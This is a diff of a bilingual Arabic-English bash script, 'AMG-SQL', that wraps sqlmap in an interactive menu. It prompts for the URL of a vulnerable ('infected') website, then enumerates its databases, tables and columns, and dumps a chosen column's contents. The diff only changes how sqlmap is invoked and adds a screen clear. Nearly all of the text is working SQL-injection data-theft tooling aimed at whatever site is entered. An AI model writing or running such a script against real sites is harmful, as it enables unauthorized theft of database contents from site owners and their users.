@@ -24,21 +24,22 @@ while true;do
 echo -e  "Enter The ${red} URL${Lgreen} ادخل عنوان الموقع المصاب${none} : "
 echo -e "${red}EX :${yellow} WWW.EXAMPLE.COM/LOGIN.PHP?ID=1${none}"
 read -p "AMG-SQL>>" URL
-sqlmap -u $URL --dbs
+python sqlmap.py -u $URL --dbs
 echo -e "${Lgray}(sqlmap -u $URL --dbs)${none}"
 echo -e "${Lpurple}Database Name اسم قاعدة البيانات${none} : "
 read -p "AMG-SQL>>" DB
-sqlmap -u $URL -D $DB --tables
+python sqlmap.py -u $URL -D $DB --tables
 echo -e "${Lgray}(sqlmap -u $URL -D $DB --tables)${none}"
 echo -e "${Lpurple}Table Name اسم القائمة${none} : "
 read -p "AMG-SQL>>" TB
-sqlmap -u $URL --dbs -D $DB --tables -T $TB --columns
+python sqlmap.py -u $URL --dbs -D $DB --tables -T $TB --columns
 echo -e "${Lgray}(sqlmap -u $URL --dbs -D $DB --tables -T $TB --columns)${none}"
 echo -e "${Lpurple}Column Name اسم العمود${none} : "
 read -p "AMG-SQL>>" CM
-sqlmap -u $URL --dbs -D $DB --tables -T $TB --columns -C $CM --dump
+python sqlmap.py -u $URL --dbs -D $DB --tables -T $TB --columns -C $CM --dump
 echo -e "${Lgray}(sqlmap -u $URL --dbs -D $DB --tables -T $TB --columns -C $CM --dump)${none}"
 echo -e "${Lblue}exit${red} هل تريد الخروج؟اكتب${none}  "
 read -p "AMG-SQL>>" Ex
+clear
 $Ex
 done
